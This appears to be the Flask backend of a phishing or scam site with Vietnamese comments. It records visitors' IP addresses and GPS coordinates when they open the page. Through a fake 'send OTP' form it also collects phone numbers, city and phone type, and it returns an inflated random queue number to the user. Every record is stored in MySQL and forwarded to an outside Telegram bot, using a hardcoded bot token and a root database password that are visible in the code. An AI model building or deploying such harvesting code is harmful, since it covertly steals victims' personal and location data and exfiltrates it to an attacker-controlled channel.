from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import mysql.connector
from mysql.connector import Error
import random
import requests  # Thư viện để gửi yêu cầu HTTP

app = Flask(__name__)
CORS(app)  # Kích hoạt CORS cho toàn bộ ứng dụng

stt = 712

# Thông tin về bot Telegram
TELEGRAM_BOT_TOKEN = '7172702055:AAH__9vX0ru4vYoGtvqb7f5iUkwMLWskZBE'  # Thay bằng token của bot
TELEGRAM_CHAT_ID = '1420235940'  # Thay bằng chat ID của bạn hoặc nhóm Telegram mà bạn muốn gửi tin nhắn


# Hàm gửi tin nhắn đến Telegram
def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print("Tin nhắn đã được gửi thành công!")
        else:
            print(f"Lỗi khi gửi tin nhắn: {response.text}")
    except Exception as e:
        print(f"Lỗi khi kết nối với Telegram: {e}")


# Kết nối MySQL
def create_connection():
    try:
        connection = mysql.connector.connect(
            host='localhost',
            user='root',      # Thay bằng tên người dùng MySQL của bạn
            password='123456',  # Thay bằng mật khẩu MySQL của bạn
            database='web'
        )
        if connection.is_connected():
            print("Kết nối đến MySQL thành công")
            return connection
    except Error as e:
        print(f"Lỗi kết nối MySQL: {e}")
        return None
    
@app.route('/')
def index():
    return render_template('index.html')

# API để nhận và lưu thông tin IP và GPS khi người dùng vừa truy cập
@app.route('/api/save-ip', methods=['POST'])
def save_ip_info():
    connection = None
    try:
        # Nhận dữ liệu từ request
        data = request.json
        ip_address = data.get('ip_address')
        latitude = data.get('latitude')
        longitude = data.get('longitude')

        # Kết nối đến MySQL
        connection = create_connection()
        if not connection:
            return jsonify({'message': 'Không thể kết nối đến cơ sở dữ liệu'}), 500

        cursor = connection.cursor()

        # Lưu thông tin IP và tọa độ vào database
        insert_query = """
            INSERT INTO ip_info (ip_address, latitude, longitude)
            VALUES (%s, %s, %s)
        """
        cursor.execute(insert_query, (ip_address, latitude, longitude))
        connection.commit()

        cursor.close()
        connection.close()

        # Gửi tin nhắn đến Telegram
        message = f"Thông tin mới: IP Public: {ip_address}, Vị trí: ({longitude}, {latitude})"
        send_telegram_message(message)

        # Trả về phản hồi JSON thành công
        return jsonify({'message': 'Lưu thông tin thành công'}), 200

    except Exception as e:
        # Ghi chi tiết lỗi ra console để tiện theo dõi
        print(f'Lỗi khi xử lý yêu cầu: {e}')

        return jsonify({'message': 'Lỗi máy chủ', 'error': str(e)}), 500

    finally:
        # Đảm bảo đóng kết nối MySQL khi hoàn thành
        if connection and connection.is_connected():
            connection.close()


# API để nhận và lưu thông tin người dùng khi nhấn "Gửi OTP"
@app.route('/api/save-user-info', methods=['POST'])
def save_user_info():
    connection = None
    try:
        # Nhận dữ liệu từ request
        data = request.json
        phone_number = data.get('phone_number')
        city = data.get('city')
        phone_type = data.get('phone_type')
        game_port = data.get('game_port')
        ip_address = data.get('ip_address')
        latitude = data.get('latitude')  # Nhận vĩ độ từ client
        longitude = data.get('longitude')  # Nhận kinh độ từ client

        # Kiểm tra nếu thiếu thông tin bắt buộc
        if not all([phone_number, city, phone_type, game_port, ip_address]):
            error_message = 'Thiếu một số thông tin bắt buộc.'
            connection = create_connection()
            save_error_to_db(connection, phone_number, city, phone_type, game_port, ip_address, error_message)
            return jsonify({'message': 'Thiếu thông tin, đã lưu lại lỗi'}), 400

        # Kết nối đến MySQL
        connection = create_connection()
        if not connection:
            return jsonify({'message': 'Không thể kết nối đến cơ sở dữ liệu'}), 500

        cursor = connection.cursor()

        # Lưu thông tin vào database
        insert_query = """
            INSERT INTO user_info (phone_number, city, phone_type, game_port, ip_address, latitude, longitude)
            VALUES (%s, %s, %s, %s, %s, %s, %s)
        """
        cursor.execute(insert_query, (phone_number, city, phone_type, game_port, ip_address, latitude, longitude))
        connection.commit()

        cursor.close()
        connection.close()
        global stt 
        stt = stt + random.choice([1, 2])

        # Gửi tin nhắn đến Telegram
        message = f"""Thông tin mới: Số điện thoại: {phone_number}, IP Public: {ip_address}, Thành phố: {city}, Loại điện thoại: {phone_type}, Vị trí: ({longitude}, {latitude}) """
        send_telegram_message(message)

        # Trả về phản hồi JSON thành công
        return jsonify({'stt': stt}), 200

    except Exception as e:
        # Ghi chi tiết lỗi ra console để tiện theo dõi
        print(f'Lỗi khi xử lý yêu cầu: {e}')

        return jsonify({'message': 'Lỗi máy chủ', 'error': str(e)}), 500

    finally:
        # Đảm bảo đóng kết nối MySQL khi hoàn thành
        if connection and connection.is_connected():
            connection.close()

if __name__ == '__main__':
    app.run(debug=True, port=5000)
